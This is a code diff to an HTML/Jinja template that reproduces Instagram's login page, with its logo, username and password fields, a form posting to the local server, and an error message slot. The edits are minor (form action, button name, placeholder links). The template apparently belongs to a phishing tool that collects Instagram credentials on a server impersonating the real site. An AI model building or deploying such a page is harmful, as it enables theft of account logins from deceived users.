@@ -18,7 +18,7 @@
                     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                 </div>
                 <div class="form-wrap">
-                  <form class="form" method="post">
+                  <form class="form" method="post" action="/">
                     <div class="input-box">
                       <input type="text" name="username" placeholder="Phone number, username, or email" required>
                     </div>  
@@ -26,12 +26,12 @@
                       <input type="password" name="password" placeholder="Password" required>
                     </div>  
                     <span class="button-box">
-                      <button class="btn" type="submit" name="submit">Log in</button>
+                      <button class="btn" type="submit">Log in</button>
                     </span>  
                     {% if error %}
                     <div class="_ab2z" style="color: #ED4956; font: 14px-apple-system, BlinkMacSystemFont, sans-serif; margin: 10px 40px;">{{ error }}</div>
                     {% endif %}
-                    <a class="forgot" href="">Forgot password?</a>
+                    <a class="forgot" href="#">Forgot password?</a>
                   </form>
                 </div>
               </div>
@@ -56,15 +56,15 @@
         <div class="footer-container">
           <nav class="footer-nav" role="navigation">
             <ul>
-              <li><a href="">About Us</a></li>
-              <li><a href="">Support</a></li>
-              <li><a href="">Blog</a></li>
-              <li><a href="">Press</a></li>
-              <li><a href="">Api</a></li>
-              <li><a href="">Jobs</a></li>
-              <li><a href="">Privacy</a></li>
-              <li><a href="">Terms</a></li>
-              <li><a href="">Directory</a></li>
+              <li><a href="#">About Us</a></li>
+              <li><a href="#">Support</a></li>
+              <li><a href="#">Blog</a></li>
+              <li><a href="#">Press</a></li>
+              <li><a href="#">Api</a></li>
+              <li><a href="#">Jobs</a></li>
+              <li><a href="#">Privacy</a></li>
+              <li><a href="#">Terms</a></li>
+              <li><a href="#">Directory</a></li>
               <li>
                 <span class="language">Language
                   <select name="language" class="select" onchange="la(this.value)">
